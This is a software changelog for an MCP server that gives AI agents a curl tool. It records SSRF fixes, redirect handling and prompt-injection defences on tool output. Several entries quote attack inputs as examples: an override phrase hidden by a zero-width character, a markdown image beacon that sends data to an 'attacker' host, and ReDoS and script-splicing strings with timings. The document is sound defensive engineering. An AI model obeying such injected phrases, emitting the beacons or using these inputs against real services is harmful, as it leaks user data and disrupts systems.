# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [5.2.0] - 2026-10-30

### Notes

- **Shipped in a MINOR release by decision.** The `**BREAKING:**` changes below go
  out as 5.2.0, not 6.0.0: mcp-curl has one consumer, internal, and that consumer
  is told about each change directly. This is a larger break than earlier MINORs
  carried, and the decision was made knowing that. `LESSONS.md` RC-67.
- **This release reverses a 5.1.0 decline.** 5.1.0 said `baseUrl` would not pin
  absolute URLs to its origin. With `allowedHosts` unset, a `baseUrl` server now
  reaches only its `baseUrl`'s host. `LESSONS.md` RC-68.
- **Not in this release, by decision:**
  - **A per-host `rateLimit` map.** One limit applies to every host. Revisit when
    one server fronts a second API.
  - **Persisting the rate-limit count across restarts.** It adds disk state and a
    race between processes; with `syncFromHeaders`, the first response after a
    restart corrects the count.
  - **`reset` in `syncFromHeaders`.** Whether a reset header carries seconds or an
    epoch is a vendor fact; `remaining` alone needs no new limiter state.
  - **Refusal codes for an SSRF or DNS failure on the first request, and for
    `jq_query`.** The first request keeps its existing messages; `jq_query` sends
    no request.
  - **A hop count in the `include_metadata` envelope.**
  - **A cURL version check.** `syncFromHeaders` needs cURL 7.84 or later, and
    mcp-curl runs on macOS with Homebrew's cURL.

### Added

- **`allowedHosts`: the hosts a request may reach.** A list of bare host names or
  IP literals, matched exactly, case-insensitively, trailing dots ignored; `"any"`
  allows every host and `[]` refuses every request. Checked before DNS, so a
  refused host is never resolved or contacted, and checked again on every redirect
  hop. Unset, a server with a `baseUrl` may reach only the `baseUrl`'s host (see
  *Changed*). `configure()` throws on an entry with a scheme, port, path, userinfo
  or wildcard. `deriveHostPolicy` and `HostPolicy` are exported for callers of
  `executeCurlRequest`.
- **`rateLimit.syncFromHeaders: { remaining: "<header name>" }`.** After each
  response, the host that answered is counted as having used at least
  `max − remaining`, so a count this process cannot see (another client, a
  restart) tightens the local limit. It only ever tightens, and an absent, empty or
  malformed value changes nothing. `configure()` throws on a name that is not an
  HTTP field name, on a `%`, and on any key but `remaining`. Needs cURL 7.84 or
  later.
- **Local refusal codes.** A request refused before it is sent returns an error
  result beginning `Refused locally: no request was sent (CODE).`, followed by the
  reason (and `Retry in N s.` where the reason is the rate limit), and never a
  host, URL or header value:
  `LOCAL_HOST_NOT_ALLOWED`, `LOCAL_RATE_LIMITED`, `LOCAL_REFUSED_PATH`. A redirect
  hop refused after earlier hops were sent is `LOCAL_REDIRECT_REFUSED`, and its
  first line says how many requests went out. `curl_execute`'s stderr line logs
  the code, never the message.

### Changed

- **BREAKING: setting `baseUrl` restricts requests to its host.** With
  `allowedHosts` unset, an absolute URL to any other host is refused as
  `LOCAL_HOST_NOT_ALLOWED`, and a redirect hop to one as
  `LOCAL_REDIRECT_REFUSED`. This applies to `curl_execute`,
  `utilities().executeRequest` and the YAML endpoint tools of a `createApiServer()`
  server, whose schema `baseUrl` sets the server's. **To adjust:** list the hosts
  in `allowedHosts`, or set `allowedHosts: "any"` for the 5.1.0 behaviour. An
  embedder overriding `generatorConfig.baseUrl` with another host must list it.
- **BREAKING: `start()` throws on a `baseUrl` that is not an absolute http(s) URL**
  when `allowedHosts` is unset, because the default host list cannot be derived
  from it. 5.1.0 started and failed each relative call instead. **To adjust:** fix
  `baseUrl`, or set `allowedHosts`.
- **BREAKING: mcp-curl follows redirects itself, and rewrites the method as
  browsers do.** cURL now runs without `-L`, and each hop is spawned separately
  after the host list, the SSRF check with its own `--resolve` pin and the rate
  limit. A 303 turns every method but `HEAD` into a body-less `GET`, and a 301 or
  302 does the same to `POST`; 307 and 308 keep the method and body. Under 5.1.0,
  cURL's `-X POST` re-sent `POST` without its body after a 301, 302 or 303.
  **To adjust:** have the API answer a method-preserving redirect with 307 or 308,
  or set `follow_redirects: false` and follow the `Location` yourself.
- **BREAKING: a redirect to another origin forwards only `Accept`,
  `Accept-Language`, `Accept-Encoding` and `User-Agent`**, plus the body headers
  while the body is kept. Every other header, `defaultHeaders` and YAML
  `auth.headers` included, and `basic_auth` and `bearer_token` are dropped, and
  stay dropped if the chain returns to the first origin. **To adjust:** call the
  redirect target directly, with its host in `allowedHosts`, where it needs a
  credential.
- **BREAKING: `include_headers` and `verbose` report the final hop only.** With
  `-L`, cURL reported every hop's headers and trace. **To adjust:** set
  `follow_redirects: false` to see a hop's own headers.
- **BREAKING: local refusal texts have changed.** The rate-limit refusal, the
  relative-path refusals and a YAML path parameter's `.`/`..` refusal now take the
  shape under *Added* → *Local refusal codes*, and the rate-limit text ends
  `Retry in N s.` A chain longer than `max_redirects` is
  `LOCAL_REDIRECT_REFUSED` rather than cURL's exit 47. **To adjust:** match on the
  code in parentheses, not on the sentence.
- **BREAKING: a `curl_execute` `url` starting `//` or `\` on a `baseUrl` server
  returns a tool result**, `LOCAL_REFUSED_PATH`, where 5.1.0 rejected it at the
  schema with a `-32602` protocol error the model never saw. **To adjust:** read
  the refusal from the tool result.
- **The `curl_execute` description is shorter** (about 2.3 KB, from 6.7 KB). The
  parameter list and `jq_filter` syntax are in the input schema already; what
  only the description said about `include_headers` (macOS only, final hop,
  credentials in header text) and redirects moved into the schema. The version line
  still matches `^mcp-curl v\d+\.\d+\.\d+$`: search for it rather than taking
  the last line, which an append follows.

### Fixed

- **A redirect could reach an address the SSRF check refuses** (todo 007). cURL
  followed redirects with `-L`, so only the first hop was checked and pinned: a 302
  to `169.254.169.254`, an RFC 1918 address or a privileged loopback port returned
  that target's body. Every hop is now checked, pinned and counted, and one
  deadline covers the whole chain.

## [5.1.0] - 2026-10-26

### Notes

- **Not in this release, by decision:**
  - **`baseUrl` does not pin absolute URLs to its origin.** It is a convenience,
    not a security boundary; pinning would narrow a published input. Keep a
    credential in `defaultHeaders`, never in tool-call arguments, so it stays out
    of the transcript. `defaultHeaders` are sent to every host, so this does not
    scope the key to `baseUrl` (`docs/configuration.md` → *defaultHeaders*).
  - **`utilities()` calls do not run hooks.** No in-process hook can count
    requests made by another process on the same credential, which is what an
    embedder counting quota needs.
  - **The MCP `serverInfo` name and version are not configurable.** The version
    line and `curlExecuteDescriptionAppend` identify the server inside a session.

### Added

- **`rateLimit { max, windowMs }`: a configurable per-host sliding window.** At most
  `max` requests to any one host in any `windowMs` span, replacing the fixed default
  of 60 per host per minute. Unset, the default and its refusal text are unchanged.
  `configure()` throws unless both fields are positive integers. `start()` applies
  it process-wide, so it also counts `utilities().executeRequest` and YAML endpoint
  tools, and `shutdown()` restores the default. Only one server in a process may
  hold a `rateLimit`; a second server's `start()` with its own throws. It is local
  throttling, not quota accounting: a process restart starts the count again, and
  requests made elsewhere on the same credential are not seen, so leave headroom
  below a hard upstream quota. `HostRateLimit` is exported.
- **`curlExecuteDescriptionAppend`: embedder text at the end of the `curl_execute`
  description**, for what the model needs to know about the API the server
  fronts. `configure()` replaces each run of Unicode attack codepoints with a
  space, trims it, and throws if the result is over
  `MAX_CURL_EXECUTE_DESCRIPTION_APPEND_LENGTH` (8000, exported); it is never
  truncated. It is sent on every turn, so keep it short. With `curl_execute`
  disabled the append is not shown, and `start()` warns.
- **`docs/getting-started.md` → *Reporting a configuration error*:** how to catch a
  `configure()` or config-loading failure, start anyway, and return the reason
  from `curl_execute` instead of exiting before a client connects.

### Changed

- **BREAKING: `utilities().executeRequest` refuses a relative value a URL parser would
  read as a host.** With `baseUrl` configured, a `path` (after its missing leading `/`
  is added) or a relative `url` must start with a single `/` and contain no control
  characters. A value starting `//`, `/\` or `\` — for example `path: "//users"`,
  which 5.0.x joined to `<baseUrl>//users` — now returns an error result that states
  the rule, and no request is made. So does any control character (C0 or DEL)
  anywhere in it: the SSRF check's URL parser strips a tab, CR or LF and
  percent-encodes the rest, so the URL it checks is not the value handed to cURL. **To adjust:**
  collapse leading slashes, and percent-encode segments built from data.
- **BREAKING: a `.` or `..` path segment is refused, not resolved.** A relative `url`
  or `path` (on `executeRequest` and on `curl_execute`) and a YAML endpoint's path
  parameter return an error result when a whole path segment is `.` or `..`, literal
  or `%2e`-encoded in any case. Both the SSRF check and cURL resolve such a segment,
  so `/users/..` requested the parent of the path it was built under, and
  `encodeURIComponent` does not prevent it. Only the path is checked: a dot in the
  query or fragment, or a dot that is not the whole segment (`/v1.2/`,
  `/.well-known/`), still passes. An absolute `curl_execute` url is not checked,
  because it names its own path. **To adjust:** do not build a path segment from a
  bare `.` or `..`.
  **Both changes shipped in a MINOR release by decision**, not by oversight: mcp-curl has one
  consumer, internal, and that consumer is told about this change directly.
- **The `curl_execute` description gains a version line**, `mcp-curl v<version>`,
  after the built-in text and before any `curlExecuteDescriptionAppend`.
  A session can read the package version without matching prose; line 1 is still
  the summary. **The description's bytes now change with every release**, so a
  client or test that pins the full description text must expect that. The MCP
  `serverInfo.name` is still `curl-mcp-server`, a different string from the
  package name in this line.

### Fixed

- **`baseUrl` works on the `curl_execute` tool path.** The strict `url` schema
  rejected every relative url before the handler ran, so the prepend never fired.
  A server with `baseUrl` now advertises `url` as an absolute http(s) URL or a
  single-`/` path (`anyOf`), and resolves the path against the base before the SSRF
  check. A server without `baseUrl`, the standalone binary included, advertises the
  same schema as before. `executeRequest` resolves a relative `url` the same way, so
  the `docs/custom-tools.md` examples now work as written. `baseUrl` is a
  convenience, not a host restriction: an absolute URL to any host still passes.

## [5.0.1] - 2026-10-20

### Notes

- **Nothing in the published package changed.** No production module was touched,
  so `dist` builds byte-identical to 5.0.0. This release tags the branch that adds
  the guard below; consumers can skip it.

### Added

- **An end-to-end guard against a JSON size decision taken before sanitising.** A
  JSON body with no `Content-Type` is above `STRIP_PATH_MAX_BYTES` as sent and below
  it once Step 2 collapses its padding, and carries `<!--` in an early field and
  `-->` in a late one. The guard drives it through the shipped registration path
  and asserts that every key survives, byte-exact, both inline and in the saved
  artefact. A size cap reinstated in `classifyBody` fails the guard, and so does
  one in `defendForInline` alone, which deletes the fields between the markers.

- **`response/strip-cap-straddle.test-fixture.ts`** holds that input and its
  precondition. The precondition is measured with the real cap and the real
  sanitiser, and both the end-to-end guard and the `defendText` unit case use it,
  so a moved cap or a changed collapse rule fails both instead of emptying one.

## [5.0.0] - 2026-10-20

### Changed

- **BREAKING: a JSON payload is detected on, never rewritten, at every layer.**
  The server is middleware: the payload is the calling agent's to interpret. Unicode
  attack codepoints (zero-width, bidi overrides and the rest of the sanitiser's
  class) are no longer removed from a JSON body by `curl_execute`, from
  `jq_query`'s or `curl_execute --jq_filter`'s output, or from a JSON text part the
  wrap returns — which includes the results of YAML-schema tools and custom tools
  registered on `McpCurlServer`. The `[injection-defense]` detection log still
  fires on all of them. A custom tool that wants those codepoints removed from its
  JSON result removes them itself. Non-JSON text — headers, stderr, a non-JSON
  custom-tool result — keeps the full pipeline.

- **A JSON body is the origin's octets, inline and saved, BOM included.** The
  body is classified as it arrived, the same question the wrap asks of every text
  part, so a body led by a U+FEFF or a Unicode space (NBSP, U+3000 and the rest of
  the class `String.prototype.trim` removes) is JSON on every path and is never
  replaced by its sanitised form. `jq_query` trims before it parses, so it opens
  such a file. A body that parses only once an invisible character between tokens
  is removed now classifies as not JSON, and is saved and reported as such. The
  sanitised form is written only for a saved non-JSON body Step 2 changed, and the
  message now names the whitespace and newline collapse as well as the codepoint
  removal.

- **Injection detection reads the sanitised form as well as the original, and a
  JSON document's decoded strings.** A phrase split by a zero-width or bidi
  character (`Ig\u200bnore previous instructions`) is now logged on every path,
  the published `sanitizeAndDetect` and `defendText` included; on a JSON arm, so
  is a phrase spelled with string escapes (`\u0049gnore`, as six ASCII bytes),
  which no text form showed. Each escaped string token is decoded on its own, so
  a duplicate member or an escaped newline or control character cannot hide one.
  Nothing more is rewritten; the `[injection-defense]`
  log is the only effect.

- **`curl_execute`'s description states the contract it keeps.** It said attack
  codepoints are removed from a JSON body first; it now says nothing in one is
  removed or rewritten, and names every transform a saved non-JSON artefact can
  carry. It also no longer says a `jq_filter` on a body that is not JSON returns an
  error with a preview: the filter is skipped and the body saved and reported. The
  over-cap message quotes the decoded size beside the on-disk size when a lossy
  decode grew the body; saved-file messages name the U+FFFD substitution on a
  sanitised artefact, and no longer tell the model `jq_query` cannot read a non-JSON
  body's file.

- **The over-cap notice leads with the saved file.** It says the file is valid to
  analyse with `jq_query` at no further request, and offers narrowing the next
  request (fewer fields, a limit, pagination) second — on a rate-limited API a
  re-request spends quota the bytes on disk do not. It no longer claims an "inline
  defence pass" that does not run on JSON.

### Removed

- **Internal:** `exceedsInlineCap`, `MAX_INLINE_GROWTH_RATIO` and
  `SHORTEST_REPLACED_BEACON`. Both size gates weigh JSON only, and the wrap
  returns JSON unchanged, so the gate is a byte comparison. None was on a
  published entry point.

## [4.0.2] - 2026-09-10

### Notes

- **Nothing in the published package changed.** No production module was touched,
  so `dist` builds byte-identical to 4.0.1. This release exists so the branch that
  rewrote the ReDoS timing guards has a tag; consumers can skip it.

### Changed

- **The invariant-15 ReDoS guards measure CPU time, not wall clock.** `Date.now()`
  keeps counting while a vitest worker is descheduled, so beside the suite's own
  parallel workers the guards measured host load rather than pattern cost: cases
  costing 6-22 ms of CPU read 124-161 ms of wall clock under contention and failed
  a 100 ms budget. No margin closes that, because a descheduled measurement is
  unbounded however wide the budget is. `response/cpu-time.test-fixture.ts::cpuMs`
  is the clock, and it refuses a body it could only have measured a prefix of.

- **The budget is derived from a measured baseline rather than pinned.** An
  absolute millisecond figure separating two populations that both scale with the
  host's single-core throughput is a property of one machine, and there is no CI
  here — the suite runs wherever the operator is. `REDOS_BUDGET_RATIO` is now the
  declaration and `strip-blocks.test.ts::calibrateBudgetMs` derives the figure.

### Added

- **`npm run redos:matrix` — the teeth matrix as a runnable control rather than
  prose.** It derives the mechanism list from `strip-blocks.ts`, mutates a bundle
  of the real source, probes subsets rather than singletons, and asserts four
  properties: every mechanism has a detector attributable to it, every `NO TEETH`
  marker really has none, the marker count matches, and every input it measures is
  byte-identical to the test's row of the same label *and* timed against the same
  function. `--check` exits non-zero. Not part of `npm test` — runtime is minutes.

- `esbuild` as a direct devDependency, for the matrix's bundling step. It was
  previously reached only transitively through `tsup` and `vitest`.

## [4.0.1] - 2026-09-09

### Security

- **Saved response files can no longer overwrite each other, and the write no
  longer follows a symlink.** A saved artefact was named
  `${safeBase}_${Date.now()}.txt` and written non-exclusively, so two saves
  resolving to one path left the second silently replacing the first — both
  callers holding the same path, and no error on either side. Persistence now
  routes through a single sink, `response/file-saver.ts::writeUniqueFile`, which
  writes with `flag: "wx"`. A residual collision surfaces as `EEXIST` rather
  than an overwrite, the write refuses a symlink at the final component, and
  `mode: 0o600` applies to every file created rather than only to those that did
  not already exist.

- **The filename base is sanitised on both of its inputs.** A caller-supplied
  fallback name reached the filename unsanitised, so a `../` inside it could
  place caller-chosen bytes outside the validated output directory.

### Fixed

- Two saves inside the same millisecond now produce distinct paths. Eight hex
  characters of a `randomUUID` are what separate them; the timestamp is retained
  only so that saved artefacts sort chronologically.

### Notes

- **No published API change.** `writeUniqueFile` is exported from the internal
  `response/` barrel only, and appears in none of the four declaration files the
  `exports` map reaches.

## [3.5.1] - 2026-09-04

### Security

- **Process-lifetime maps are now bounded at the write, not by an interval.** Four
  maps keyed by values the model or the remote chooses — the two rate-limit
  counters and both log throttles — were bounded only by a `setInterval` that a
  *caller* has to start. Exported entry points exist that never start it:
  `registerEndpointTools` and `sanitizeAndDetect` both reach a throttle with no
  cleanup starter available, so on those paths the interval was no bound at all.
  Each now enforces its ceiling where the entry is written. (The session store,
  the fifth member of the class, already refused past its ceiling.)

- **The two policies are deliberately different.** A log throttle **evicts** —
  losing a memo costs one extra line of stderr. A rate-limit counter **refuses** —
  evicting one would reset it and bypass the limit, so a key that cannot be
  tracked is not admitted untracked. `RATE_LIMIT.MAX_TRACKED_KEYS` is derived from
  `SESSION.MAX_SESSIONS × MAX_PER_CLIENT_PER_MINUTE` so the ceiling cannot go
  stale if either input moves.

- **Rate-limit windows are measured on a monotonic clock.** `Date.now()` moves
  backwards on an NTP correction, a VM resume or a snapshot restore, and a window
  measured against it failed in both directions at once: an entry stamped in the
  future never expired and wedged the tracking ceiling, while reading that same
  negative age as expiry handed every caller already at its quota a fresh one.
  Windows now read `performance.now()`, and the negative-age special case is gone
  rather than reinterpreted. `RateLimitEntry.windowStart` is milliseconds since
  process start and must never be compared with `Date.now()`.

### Fixed

- **`--resolve` is pinned from the resolved IP, asserted at the producer.** A test
  now checks the argv carries the resolver's address rather than anything
  derivable from the URL.

- **`headers_unsupported` was documented backwards** in the `curl_execute`
  documentation resource — qualified "(macOS only)" when it is the state every
  *non*-macOS host reports. Header capture is implemented for macOS only. This
  text is served to the model, so it was actively teaching the wrong platform rule.

- **`normalizeLabel` no longer contains raw control bytes.** A literal NUL in its
  character class made git and ripgrep classify `wrap-error-logger.ts` as binary,
  so every `src/` sweep silently skipped the file — including the sweeps used to
  audit the bounds above. Rewritten with `\u` escapes; behaviour is identical.

### Changed

- `docs/architecture/architecture.md` (published) no longer claims the `--resolve`
  pin defeats DNS rebinding without qualification. It closes rebinding **on the
  first hop**; redirect targets are neither pinned nor re-validated. The same
  caveat now appears in all three places that previously claimed otherwise, and
  the rate-limiting section states the tracking ceiling, its derivation and the
  refuse-not-evict rationale.

## [3.5.0] - 2026-09-03

### Changed — `include_headers` no longer shares a stream with the body

- **cURL writes the response header block to its own file descriptor.** The flag is
  `--dump-header /dev/fd/3`, pointing at a pipe the server opens as a fourth stdio slot, so
  headers and body never travel on one stream and there is no boundary to recover from the
  response bytes. `ARCHITECTURE.md` invariant 13 leads with the strong form because of this:
  two remote-controlled regions do not share a channel. Three prior attempts to derive that
  boundary arithmetically each failed differently — a forgeable status-line scan (RC-1), a wire
  byte count applied to lossily decoded text (RC-2), and an octet index that chunked trailers
  land past (RC-17).
- **`include_headers` requires macOS.** libuv backs the extra stdio slot with `socketpair(2)`,
  so the child's fd 3 is an `AF_UNIX` socket; macOS serves `/dev/fd/N` from `fdescfs` and can
  reopen it, while Linux resolves `/dev/fd` to `/proc/self/fd`, where a socket cannot be opened
  at all. On any other platform the flag is never added: the request keeps its body and the
  result reports `headers_unsupported`. Every other tool parameter stays platform-neutral.
- **`include_headers` composes with `save_to_file` and `jq_filter` unconditionally.** The
  refusal that fired when the header boundary could not be determined is gone, because what
  those two receive is body bytes on every path — including the one where no header block
  arrived.

### Added

- `headers_unsupported` metadata field (and the matching `[mcp-curl]` notice on the plain
  branch): this host cannot capture headers. **A fact about the host, deliberately distinct
  from `headers_undetermined`, which says the origin sent no header block.** Collapsing the two
  would tell a caller auditing an origin's security headers that it sends none, on every URL.
- `header_bytes_returned`: how many origin octets survived a truncation, reported beside
  `header_bytes_received`. **Absent where the defence grew the text past the ceiling**, because
  the surviving count then cannot be stated in origin units — `headers_truncated` still reports
  the cut, and no ratio is invented. Both cuts land on a byte boundary, so header text cut
  mid-sequence ends in U+FFFD.

### Fixed

- **Response header bytes are bounded on acceptance as well as on retention.** Retention is
  capped at `LIMITS.MAX_HEADER_TEXT_BYTES` and acceptance at `LIMITS.MAX_RESPONSE_SIZE`, counted
  across stdout, stderr and the header descriptor against one memory ceiling. A redirect chain
  was measured putting 2.5 MB on this descriptor against a 64 KB usable ceiling.
- **A non-zero cURL exit is reported on the plain (non-metadata) branch.** Without it a failed
  request is byte-identical to an empty successful one. The "the body below is unaffected"
  reassurance is claimed only on a clean exit, because cURL can emit partial output before a
  non-zero exit — it writes what it has already received, and only some failures precede the
  first body byte. A non-zero exit therefore says nothing about whether the bytes below it are
  complete, which is exactly why the reassurance cannot be keyed on anything weaker.

### Removed

- `splitResponseHeaders`, the `SplitResponse` type, and `ParsedResponse.headerBytes` /
  `ParsedResponse.bodyBytes`. Nothing separates headers from body, so the offset-based split has
  no caller. **None of these were on a package entry point** — `mcp-curl` and `mcp-curl/lib`
  export only `defendText` and `DefendTextOptions` from the response module — so this is an
  internal removal, not a breaking change under `ARCHITECTURE.md` invariant 11.
- The `include_headers` + `save_to_file` / `jq_filter` refusal, and the
  "Response header boundary could not be determined" error it raised. **A caller matching on
  that message will no longer see it**, because the condition it guarded cannot occur.

## [3.4.0] - 2026-09-02

### Security

- **The defence deleted a JSON field when two of its values held the halves of one markup token.** By
  the post-processor wrap, `formatResponse` has sealed body, headers and stderr into a single JSON
  envelope, and the strip stages pair an opening token with a closing one without any notion of the
  syntax separating two fields. A body carrying `<!--` and a response header carrying `-->` therefore
  had everything between them removed — **including the whole `headers` key** — and the result was
  still valid JSON, so nothing downstream could tell. The same held for one plain JSON document whose
  sibling values carried the two halves, which is the shape `jq_query` returns. `defendForInline` now
  parses a JSON document and defends each string value separately; text that is not JSON still takes
  the undivided scan. Re-serialising indents only where indenting does not grow the document, so the
  size gate's growth bound stays sound — `formatResponse` and jq both emit two spaces and come back
  looking as they went in. Object keys are deliberately
  left undefended, because two keys defending to the same string would collapse into one — the very
  loss this fixes. See `ARCHITECTURE.md` invariant 16.

- **A quadratic scan in the response strip path could block the event loop for 82 seconds.** Four of
  the five markdown beacon patterns shared a `[^\]\n]*` label class, so a failing match attempt
  scanned forward from every `[` in the input: O(n) attempts of O(n). 256 KB of `[` measured 82.9 s,
  synchronously, on the thread serving every session — on stdio the server is dead for the duration,
  on HTTP every session stalls. The `<script`/`<style` openers had the same shape at 4.5 s. The
  patterns' own docblock claimed the 256 KB cap guaranteed "wall-clock < 100 ms on any adversarial
  input"; it was wrong by ~800×, because a byte cap bounds the input and never the cost. The ReDoS
  guard that should have caught it fed a single opener, which the pattern consumed in one match, so
  it could not fail.

  Every pass now runs over only the prefix ending at that pattern's own closing token, so a failing
  attempt cannot scan to end-of-input. **The first attempt at this bound keyed on the wrong tokens
  and closed only part of the class** — a bare `>` does not bound a closer of `</script>`, and
  excluding `[` from a markdown label does not bound a URL class ending at `)`. Review of this PR
  measured what remained: `"<script>".repeat(32000)` 1.1 s, `"<script></x>".repeat(20000)` 1.7 s,
  `"[a](https://x".repeat(19000)` 2.9 s, and `"<!--".repeat(65536)` **5.5 s** — the last a
  regression this branch introduced by removing the open-to-EOF arm without bounding what replaced
  it. All now run in 1–2 ms. The replacement flood tests were themselves toothless at a 2 s budget,
  which is recorded beside them.

  **A fourth review round found the class open from the opposite side, inside a bound that was
  computed correctly.** The region bound guarantees a closer lies ahead of every attempt; it does
  not guarantee the attempt can reach one. The opener `<script\b[^>]*>` had an attribute run that
  crossed `<`, so on `"<script".repeat(30000) + "</script>"` each opener consumed the region's only
  closer as its own tag terminator and then scanned to end-of-input for a second — **2881 ms on a
  205 KB body**. Round 2 had fixed exactly this on the *closer* and argued in writing that the
  asymmetry was safe. Both attribute runs are now `[^<>]*`. The cost of the exclusion is stated
  rather than buried: a literal `<` inside a quoted attribute value stops the balanced match, so
  the body survives as inert text — both tags still go, which is the RC-11 posture the closer has
  had since round 2. `LESSONS.md` RC-14.
- **`max_result_size` now bounds what the model actually receives, which is what invariant 14 already
  claimed.** The defence pass can make text longer — `[link removed]` is 14 bytes and the shortest
  form it replaces is 9 — and this release added a second pass at the post-processor wrap,
  downstream of every size gate. A `text/plain` body of `"[a](file:)".repeat(100)`, exactly 1000
  bytes under a 1000-byte cap, stayed inline and reached the model as **1400 bytes** with the gate
  reporting compliance. Both size gates now ask `exceedsInlineCap`, which weighs the defended form;
  over-cap saves to a file as it always did. Found by review, twice, independently.

  **Not fixed at the wrap, and the measurement is why.** By the wrap the body is sealed inside the
  metadata envelope: a *compliant* 1000-byte body arrives there as a 1057-byte text part under
  `include_metadata`, so a wrap-side cap would truncate correct responses mid-JSON, and the wrap has
  no file to save to. `LESSONS.md` RC-15.
- **Custom tools, hook short-circuits and YAML endpoints now get the full response defence.** The
  post-processor wrap ran `sanitizeAndDetect` alone — Step 2 of the five in `defendText` — so a
  `registerCustomTool()` handler returning remote markdown or HTML reached the model with
  exfiltration beacons (`![x](https://attacker/?d=…)`) and `<script>` blocks intact. For those
  channels the wrap is the *only* defence; there is no `processResponse` upstream of them.
- **A beacon inside a JSON string value no longer reaches the model.** The JSON exemption protects a
  persisted artefact — `processResponse` writes post-strip content to disk and `jq_query` reads it
  back — and that reasoning does not reach the wrap, whose channels write to no disk. What is
  persisted keeps the exemption; what is returned does not. **"Persisted keeps it" is true of the
  content types that can claim it:** the exemption is gated on the type being undetermined or
  sniffable, so a JSON body the origin declared `text/html` or `text/markdown` is treated as what it
  was declared to be and is persisted stripped. `ARCHITECTURE.md` invariant 1a states the gate and
  what it costs.

### Fixed

- **A `<script>` or `<style>` tag no longer survives a nested-splice payload.** Removing a tag can
  rejoin its neighbours into a new one — `"<scr".repeat(4) + "<script>" + "ipt>".repeat(4)` returned
  a live `<script>` — and iterating the strip exposes only one layer per pass, so the four-iteration
  fixed point moved the surviving depth to four rather than removing the class. Both the tag strip
  and the comment strip are now single left-to-right scans that test the output tail, which
  converges without iterating. Reported by CodeQL on two rounds and by CodeRabbit as a class.
- **An unclosed `<!--`, `<script>` or `<style>` no longer deletes the rest of the payload.** The
  open-to-end-of-input arm replaced with an empty string, so one unclosed opener truncated
  everything after it — silently, with no marker, no `isError` and no observable length delta.
  `"before <!-- unclosed\nafter"` returned `"before "`. Balanced blocks are still removed whole; an
  orphan opener now has its tag removed and its body kept as inert text, which satisfies the CodeQL
  incomplete-sanitization rule the arm was added for without deleting the caller's content.
- **A JSON body served with a markup `Content-Type` is no longer corrupted.** The entity decode
  turned `{"q":"a &#x22;b&#x22;"}` into `{"q":"a "b"}`, which no longer parses — and `save_to_file`
  persisted it for `jq_query` to fail on. The sniffed arm already excluded JSON bodies; the declared
  arm did not, so one mislabelled header was enough.

### Added

- **`defendText` is now a public export.** It is the full defence pipeline over a plain string, and
  the function the built-in tools call. Consumers building a non-MCP pipeline were previously
  pointed at `sanitizeAndDetect`, described as "the same defence the built-in tools apply" — it is
  one stage of it. `docs/custom-tools.md` is corrected accordingly.

### Changed

- **`contentTypeUndetermined` is a required field on `DefendTextOptions`.** Not a breaking change:
  the type and the function it configures are both new in this release, so no consumer can be
  holding the optional form. Both grammar selectors
  were optional and absence resolved to the *permissive* arm, so `defendText(text, { hostname })`
  compiled, looked defended, and ran Step 2 alone. Pass `false` when you know the content type —
  including knowing the origin sent none — and `true` when you could not determine it.

  **Omission now resolves to the strictest grammar at runtime as well.** A required field binds
  TypeScript callers and does nothing to a JavaScript one, and this release publishes the function —
  so the type alone left the permissive arm reachable by exactly the consumer it was added to
  protect. Reported independently by two reviewers on PR #33.
- Markdown link and image syntax in a `text/plain` or `text/html` tool result is now rewritten to
  `[link removed]` / `[image removed]` at the wrap. Previously this depended on `include_metadata`:
  with it true the body sat inside a JSON envelope that the exemption protected, with it false it
  did not, so the same bytes got two different treatments selected by an output-format flag.

## [3.3.0] - 2026-09-01

### Fixed

- **`include_headers` no longer corrupts the response body.** cURL's `-i` prepends the header block
  to the body on stdout, and that combined string was passed straight into body processing. Two
  consequences: `save_to_file` wrote the status line and headers above the JSON, so the saved file
  was not a valid JSON document and `jq_query` could not read it back; and `jq_filter` had to be
  rejected outright with "Cannot use jq_filter with include_headers". Headers are now split from the
  body before any body-shaped operation, so a saved file holds the body alone.

### Changed

- **`include_headers` composes with `jq_filter` and `save_to_file`.** The cross-field validation that
  rejected `include_headers` + `jq_filter` is gone — the combination now filters the body and reports
  the headers next to it. Under `include_metadata` the headers arrive as a discrete `headers` key
  rather than being embedded in `response`. In the plain, unfiltered, unsaved case the output is
  unchanged in substance: header text, blank line, body.

  Header text is server-controlled, so it goes through **the same defence pipeline as the body** —
  `defendText`, which is sanitise + injection-detect *and* the markup/markdown strip stages.
  Splitting it out does not route it around those defences. Header text is declared `text/markdown`
  for that pass — the strictest grammar — because header values are rendered by whatever the client
  renders. It is capped at `min(LIMITS.MAX_HEADER_TEXT_BYTES, max_result_size)` — it is surfaced
  inline even when the body was saved to a file, so it honours both its own ceiling and the
  caller's inline budget. Truncation is reported out of band (see **Added**), never as a
  marker inside the header text. On a redirect chain every header block is reported, as `curl -i` prints them.

  The header/body boundary comes from cURL's own `%{size_header}`, delivered on the `-w` metadata
  channel behind the unguessable per-request separator. It is never inferred from the response
  bytes: a body may legitimately *be* an HTTP transcript, so no pattern can tell a real header block
  from a body that looks like one.

### Changed — response shape under `include_headers`

- **`response` no longer contains the response headers when `include_headers` is set.** Under
  `include_metadata`, headers move from being embedded at the top of `response` to a discrete
  `headers` key. A consumer that grabbed a `Set-Cookie` or parsed `^HTTP/` out of `response` would
  now get nothing — silently, with no error, because the field still exists and still parses.

  **Released as a MINOR bump, deliberately.** This is a change to a published output shape and
  would ordinarily be a MAJOR. It is not treated as one because this package has no consumers:
  the rule exists to protect people pinning to the old shape, and there are none. Recording the
  decision here so it reads as a deliberate posture rather than an oversight — and so that the
  next such change, made once consumers exist, is not justified by pointing at this one.

  `mcp-curl/schema` is unaffected either way: YAML-driven endpoints pin `include_headers: false`
  (`schema/generator.ts::createToolHandler`), so no `/schema` consumer could have had headers
  inside `response`.

  Files already on disk are unaffected in either direction — `include_headers` + `save_to_file`
  wrote unparseable files before this change and `jq_query` could not read them then either, so no
  previously-written file becomes less readable.

### Added

- `headers_truncated` / `header_bytes_received` / `headers_undetermined` metadata fields, reported
  out of band so a remote cannot author them by sending the same words in a header value.
- `processor.ts::defendText` — the shared five-stage defence pipeline, so no text channel can
  assemble a shorter one.

## [3.2.0] - 2026-09-01

### Added

- **Prompt-injection hardening across every tool-response path** (PR-4 … PR-8). Response sanitisation
  expanded to cover the Variation Selector Supplement ("Sneaky Bits"), Braille blank, Hangul fillers,
  Mongolian invisibles and Arabic Letter Mark; visual-space-padding and newline runs collapsed; an
  idempotence loop defeats interleaved padding. HTML/Markdown stripping is ReDoS-hardened with a
